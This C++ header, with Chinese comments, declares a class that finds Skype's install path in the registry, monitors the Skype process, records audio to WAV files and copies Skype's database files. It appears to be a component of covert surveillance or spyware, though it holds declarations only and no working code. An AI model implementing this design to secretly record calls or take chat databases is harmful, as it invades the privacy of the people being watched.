#pragma once
#include <mmsystem.h>
#include "Audio.h"

class CSkype
{
public:
	CSkype(void);
	~CSkype(void);

	BOOL SetOutputDir(LPCTSTR strOutPath);
	BOOL StartWork();
	BOOL StopWork();

	static BOOL GetPathInReg();				//注册表中寻找skype的安装路径


private:

	static DWORD WINAPI WorkThreadEx(LPVOID lpThis);
	DWORD WorkThread();
	static DWORD WINAPI RecordingEx(LPVOID lpThis);
	DWORD Recording();
	BOOL IsPidMatch(DWORD processID);
	BOOL CheckFileSize();
	BOOL Recurse(LPCTSTR pstr);
	BOOL InitFileHeader();
	BOOL CheckSkypeStart();			//检测skype进程只否启动
	BOOL CopyDataBase();		//拷贝skype数据库文件
	BOOL StartRec();
	BOOL StopRec();


private:
	typedef struct  
	{
		char szRiff[4];
		int nSizeFile;
		char szWave[4];
		char szfmt[4];
		int nSizeFormate;
		GSM610WAVEFORMAT pfm;
		char szData[4];
		int nSizeWave;
	}WAVEFILE_HEADER, *PMOVEFILE_HEADER;

	char m_strOutPath[MAX_PATH];		//输出文件目录
	char m_strRecFileName[MAX_PATH];	//录音文件名称
	WAVEFILE_HEADER m_headFile;			//wav头文件
	BOOL m_bInitHead;					//是否初始化头文件
	HANDLE m_hThreadMonitor;			//监视skype进程
	HANDLE m_hQuit;						//工作线程退出信号
	BOOL m_bRecord;						//录音标识
	HANDLE m_hFileRec;					//录音文件句柄
	HANDLE m_hThreadRecding;			//录音线程句柄
	CAudio *m_lpAudio;					//录音对象
	HANDLE m_hEventRec;					//录音事件信号
	HANDLE m_hSkypeProcess;				//skype进程句柄，检测skype的工作状态
	BOOL m_bWorking;					//工作标识
};
